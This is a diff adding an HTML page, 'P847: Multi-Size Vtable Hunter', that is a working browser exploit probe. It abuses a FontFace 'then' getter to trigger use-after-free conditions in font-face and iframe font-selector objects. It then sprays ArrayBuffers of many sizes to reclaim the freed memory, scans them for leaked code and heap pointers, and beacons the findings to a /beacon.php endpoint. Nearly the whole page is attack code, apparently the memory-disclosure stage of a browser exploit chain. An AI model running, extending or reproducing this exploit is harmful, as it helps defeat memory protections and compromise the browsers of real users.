@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P847</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P847: Multi-Size Vtable Hunter</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P847-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+function classifyPtr(v){
+  if(v===BigInt(0))return 'Z';
+  var hi=Number(v>>BigInt(32));
+  if(hi>=0xFFFF8000)return 'K';
+  if(hi>=0x10&&hi<=0x1000)return 'H';
+  if(hi===0&&Number(v&BigInt(0xFFFFFFFF))>0x10000)return 'C';
+  if(hi>0&&hi<0x10)return 'C';
+  if(v<BigInt(0x10000))return 'S';
+  return '?';
+}
+
+bn('BOOT','start');
+log('Multi-size vtable hunter starting...','info');
+log('Goal: catch objects WITH vtables freed during FontFace UAF','info');
+log('','');
+
+/* ===================================================================
+   PHASE A: FontFace UAF with MULTI-SIZE spray
+
+   When stA.remove() + stA.textContent='' fires, multiple objects
+   are potentially freed:
+   - CSSFontFace (192B, no vtable - we already know this)
+   - CSSFontFaceRule (CSSRule subclass - HAS vtable!)
+   - MutableStyleProperties (has m_propertyVector)
+   - CSSStyleDeclaration (HAS vtable!)
+   - StyleSheetContents (ref-counted)
+   - Various string/property objects
+
+   We spray 10 different sizes to catch whatever gets freed.
+   =================================================================== */
+
+var SIZES=[48,64,80,96,112,128,160,192,224,256,320,384,512];
+var allABs={};
+var face=null;
+
+var stA=document.createElement('style');
+stA.textContent="@font-face{font-family:bbA;src:local(Arial);unicode-range:U+0042;font-style:italic;font-weight:bold;font-display:swap;}";
+document.head.appendChild(stA);
+
+face=new FontFace('fA',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var ffiredA=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffiredA)return undefined;
+    ffiredA=true;
+    if(stA){stA.remove();stA.textContent='';stA=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      allABs[sz]=[];
+      for(var i=0;i<60;i++)allABs[sz].push(new ArrayBuffer(sz));
+    }
+    try{document.fonts.check('1em bbA');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+
+document.fonts.load('1em fA, bbA','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  log('--- PHASE A: Multi-size scan ---','hot');
+  var hits=[];
+  var codeHits=[];
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var arr=allABs[sz];
+    if(!arr)continue;
+    var nzCount=0, codeCount=0, heapCount=0;
+    var firstNZ=null;
+
+    for(var i=0;i<arr.length;i++){
+      var bu=new BigUint64Array(arr[i]);
+      var hasNZ=false;
+      for(var j=0;j<bu.length;j++){
+        if(bu[j]!==BigInt(0)){
+          hasNZ=true;
+          var cls=classifyPtr(bu[j]);
+          if(cls==='C'){
+            codeCount++;
+            codeHits.push({sz:sz,idx:i,qw:j,val:bu[j],off:j*8});
+          }
+          if(cls==='H')heapCount++;
+          if(!firstNZ)firstNZ={sz:sz,idx:i,qw:j,val:bu[j],cls:cls};
+        }
+      }
+      if(hasNZ)nzCount++;
+    }
+
+    var tag=codeCount?'hot':(nzCount?'ok':'');
+    if(nzCount>0){
+      hits.push('sz'+sz+'='+nzCount+'ab(c'+codeCount+',h'+heapCount+')');
+      log('  AB('+sz+'): '+nzCount+'/'+arr.length+' hit, '+codeCount+' CODE, '+heapCount+' HEAP',tag);
+      if(firstNZ)log('    first: q'+firstNZ.qw+' +0x'+(firstNZ.off).toString(16)+' = '+hexQ(firstNZ.val)+' ['+firstNZ.cls+']',tag);
+    }
+  }
+
+  if(hits.length===0){
+    log('  No nonzero ABs at any size!','fail');
+    bn('A-MISS','0hits');
+  } else {
+    bn('A-HITS',hits.join('|'));
+  }
+
+  if(codeHits.length>0){
+    log('','');
+    log('*** CODE POINTERS FOUND! ***','hot');
+    for(var ci=0;ci<codeHits.length&&ci<20;ci++){
+      var ch=codeHits[ci];
+      log('  AB('+ch.sz+')['+ch.idx+'] q'+ch.qw+' +0x'+(ch.off).toString(16)+' = '+hexQ(ch.val),'hot');
+    }
+    bn('CODE',codeHits.slice(0,10).map(function(c){return 'sz'+c.sz+'+0x'+c.off.toString(16)+'='+hexQ(c.val);}).join('|'));
+  }
+
+  /* Dump all nonzero qwords from the 192B hit (our known CSSFontFace) */
+  var ab192=null;
+  if(allABs[192]){
+    for(var i=0;i<allABs[192].length;i++){
+      var bu=new BigUint64Array(allABs[192][i]);
+      for(var j=0;j<bu.length;j++){
+        if(bu[j]!==BigInt(0)){ab192=allABs[192][i];break;}
+      }
+      if(ab192)break;
+    }
+  }
+  if(ab192){
+    var bu192=new BigUint64Array(ab192);
+    var H=bu192[11]-BigInt(0x68);
+    var q13=bu192[13];
+    log('','');
+    log('--- 192B CSSFontFace (reference) ---','info');
+    log('H = '+hexQ(H)+', q13 = '+hexQ(q13),'ok');
+    bn('REF','H='+hexQ(H)+'|q13='+hexQ(q13));
+  }
+
+  /* ===================================================================
+     PHASE B: IFRAME CSSFontSelector destruction probe
+
+     Create an iframe with @font-face → get its CSSFontSelector address.
+     Remove iframe → Document destruction → CSSFontSelector freed.
+     Force GC → spray AB(sizeof?) to reclaim.
+     CSSFontSelector IS virtual → vtable at [addr+0] = CODE POINTER!
+     =================================================================== */
+  log('','');
+  log('--- PHASE B: Iframe CSSFontSelector hunt ---','hot');
+
+  var iframe=document.createElement('iframe');
+  iframe.style.display='none';
+  document.body.appendChild(iframe);
+
+  setTimeout(function(){
+    var iDoc=iframe.contentDocument;
+    if(!iDoc){
+      log('  No iframe document access','fail');
+      bn('B-FAIL','no-idoc');
+      finalize();
+      return;
+    }
+
+    var iStA=iDoc.createElement('style');
+    iStA.textContent="@font-face{font-family:iBB;src:local(Arial);unicode-range:U+0042;}";
+    iDoc.head.appendChild(iStA);
+
+    var iFace=new FontFace('iF',"local('Helvetica')",{unicodeRange:'U+0045'});
+    iDoc.fonts.add(iFace);
+    void iFace.loaded;
+
+    var iFired=false;
+    var iQ13=null;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(iFired)return undefined;
+        iFired=true;
+        if(iStA){iStA.remove();iStA.textContent='';iStA=null;}
+        try{iDoc.fonts.delete(this);}catch(e){}
+        try{iDoc.body.offsetHeight;}catch(e){}
+
+        var iABs=[];
+        for(var i=0;i<80;i++)iABs.push(new ArrayBuffer(192));
+        try{iDoc.fonts.check('1em iBB');}catch(e){}
+        try{iDoc.body.offsetHeight;}catch(e){}
+
+        window.__iABs=iABs;
+        return undefined;
+      },set:function(){}
+    });
+
+    iDoc.fonts.load('1em iF, iBB','CD');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      var iABs=window.__iABs||[];
+      var iHit=null;
+      for(var i=0;i<iABs.length;i++){
+        var bu=new BigUint64Array(iABs[i]);
+        for(var j=0;j<bu.length;j++){
+          if(bu[j]!==BigInt(0)){iHit=iABs[i];break;}
+        }
+        if(iHit)break;
+      }
+
+      if(!iHit){
+        log('  Iframe FontFace UAF: MISS','fail');
+        bn('B-MISS','iframe-uaf');
+        doPhaseC();
+        return;
+      }
+
+      var iBu=new BigUint64Array(iHit);
+      var iH=iBu[11]-BigInt(0x68);
+      iQ13=iBu[13];
+      log('  Iframe UAF HIT! iH='+hexQ(iH)+', iQ13='+hexQ(iQ13),'ok');
+      bn('B-HIT','iH='+hexQ(iH)+'|iQ13='+hexQ(iQ13));
+
+      /* Now DESTROY the iframe → frees Document → frees CSSFontSelector at iQ13 */
+      iframe.remove();
+      iframe=null;
+      iDoc=null;
+      iFace=null;
+
+      /* GC pressure: allocate+release lots of objects */
+      for(var gc=0;gc<5;gc++){
+        var trash=[];
+        for(var i=0;i<2000;i++)trash.push({x:i,y:new Array(16)});
+        trash.length=0;
+      }
+
+      /* Multi-size spray targeting CSSFontSelector (size unknown, try several) */
+      var cssSizes=[32,48,64,80,96,112,128,160,192,224,256,320,384,512,640,768];
+      var cssABs={};
+      for(var si=0;si<cssSizes.length;si++){
+        var sz=cssSizes[si];
+        cssABs[sz]=[];
+        for(var i=0;i<40;i++)cssABs[sz].push(new ArrayBuffer(sz));
+      }
+
+      /* Second GC pressure round */
+      for(var gc=0;gc<3;gc++){
+        var trash2=[];
+        for(var i=0;i<1000;i++)trash2.push(new Array(8));
+        trash2.length=0;
+      }
+
+      /* Scan for vtable residue */
+      var cssHits=[];
+      var cssCodeHits=[];
+
+      for(var si=0;si<cssSizes.length;si++){
+        var sz=cssSizes[si];
+        var arr=cssABs[sz];
+        var nz=0,cc=0;
+        for(var i=0;i<arr.length;i++){
+          var bu=new BigUint64Array(arr[i]);
+          var hasNZ=false;
+          for(var j=0;j<bu.length;j++){
+            if(bu[j]!==BigInt(0)){
+              hasNZ=true;
+              var cls=classifyPtr(bu[j]);
+              if(cls==='C'){
+                cc++;
+                cssCodeHits.push({sz:sz,idx:i,qw:j,val:bu[j]});
+              }
+            }
+          }
+          if(hasNZ)nz++;
+        }
+        if(nz>0)cssHits.push('sz'+sz+'='+nz+'(c'+cc+')');
+      }
+
+      if(cssHits.length>0){
+        log('  Post-iframe spray: '+cssHits.join(', '),'ok');
+        bn('B-CSS',cssHits.join('|'));
+      } else {
+        log('  Post-iframe spray: all zeroed (GC didnt free CSSFontSelector yet)','fail');
+        bn('B-ZERO','all-zero');
+      }
+
+      if(cssCodeHits.length>0){
+        log('','');
+        log('  *** IFRAME CODE POINTERS! ***','hot');
+        for(var ci=0;ci<cssCodeHits.length&&ci<10;ci++){
+          var ch=cssCodeHits[ci];
+          log('    AB('+ch.sz+')['+ch.idx+'] q'+ch.qw+' = '+hexQ(ch.val),'hot');
+        }
+        bn('B-CODE',cssCodeHits.slice(0,5).map(function(c){return 'sz'+c.sz+'q'+c.qw+'='+hexQ(c.val);}).join('|'));
+      }
+
+      doPhaseC();
+    },500);
+  },200);
+
+  function doPhaseC(){
+    /* ===================================================================
+       PHASE C: Multiple @font-face rules → more freed objects
+
+       Create a style with MULTIPLE @font-face rules. Each rule creates
+       CSSFontFaceRule + CSSFontFace + StyleProperties objects.
+       More objects freed = more chances for vtable residue.
+       =================================================================== */
+    log('','');
+    log('--- PHASE C: Multi-rule style teardown ---','hot');
+
+    var stM=document.createElement('style');
+    var rules='';
+    for(var r=0;r<8;r++){
+      rules+="@font-face{font-family:mf"+r+";src:local(Arial);unicode-range:U+00"+(0x50+r).toString(16).toUpperCase()+";font-style:normal;font-weight:"+(100+r*100)+";font-display:swap;}\n";
+    }
+    stM.textContent=rules;
+    document.head.appendChild(stM);
+    document.body.offsetHeight;
+
+    var mFace=new FontFace('mFA',"local('Helvetica')",{unicodeRange:'U+0046'});
+    document.fonts.add(mFace);
+    void mFace.loaded;
+
+    var mFired=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(mFired)return undefined;
+        mFired=true;
+        if(stM){stM.remove();stM.textContent='';stM=null;}
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+
+        var mABs={};
+        var mSizes=[48,64,80,96,112,128,160,192,224,256,320,384];
+        for(var si=0;si<mSizes.length;si++){
+          var sz=mSizes[si];
+          mABs[sz]=[];
+          for(var i=0;i<80;i++)mABs[sz].push(new ArrayBuffer(sz));
+        }
+        try{document.fonts.check('1em mf0');}catch(e){}
+        document.body.offsetHeight;
+
+        window.__mABs=mABs;
+        window.__mSizes=mSizes;
+        return undefined;
+      },set:function(){}
+    });
+
+    document.fonts.load('1em mFA, mf0','EF');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      var mABs=window.__mABs||{};
+      var mSizes=window.__mSizes||[];
+      var mHits=[];
+      var mCodeHits=[];
+
+      for(var si=0;si<mSizes.length;si++){
+        var sz=mSizes[si];
+        var arr=mABs[sz]||[];
+        var nz=0,cc=0,hc=0;
+        for(var i=0;i<arr.length;i++){
+          var bu=new BigUint64Array(arr[i]);
+          var hasNZ=false;
+          for(var j=0;j<bu.length;j++){
+            if(bu[j]!==BigInt(0)){
+              hasNZ=true;
+              var cls=classifyPtr(bu[j]);
+              if(cls==='C'){cc++;mCodeHits.push({sz:sz,idx:i,qw:j,val:bu[j],off:j*8});}
+              if(cls==='H')hc++;
+            }
+          }
+          if(hasNZ)nz++;
+        }
+        if(nz>0){
+          mHits.push('sz'+sz+'='+nz+'(c'+cc+',h'+hc+')');
+          log('  AB('+sz+'): '+nz+' hit, '+cc+' CODE',cc?'hot':'ok');
+        }
+      }
+
+      if(mHits.length===0){
+        log('  Multi-rule spray: all zeroed','fail');
+        bn('C-MISS','0hits');
+      } else {
+        bn('C-HITS',mHits.join('|'));
+      }
+
+      if(mCodeHits.length>0){
+        log('','');
+        log('  *** MULTI-RULE CODE POINTERS! ***','hot');
+        for(var ci=0;ci<mCodeHits.length&&ci<15;ci++){
+          var ch=mCodeHits[ci];
+          log('    AB('+ch.sz+')['+ch.idx+'] q'+ch.qw+' +0x'+(ch.off).toString(16)+' = '+hexQ(ch.val),'hot');
+        }
+        bn('C-CODE',mCodeHits.slice(0,8).map(function(c){return 'sz'+c.sz+'+'+c.off+'='+hexQ(c.val);}).join('|'));
+      }
+
+      finalize();
+    },500);
+  }
+
+  function finalize(){
+    log('','');
+    log('====== P847 COMPLETE ======','hot');
+    bn('DONE','complete');
+  }
+},100);
+</script></body></html>
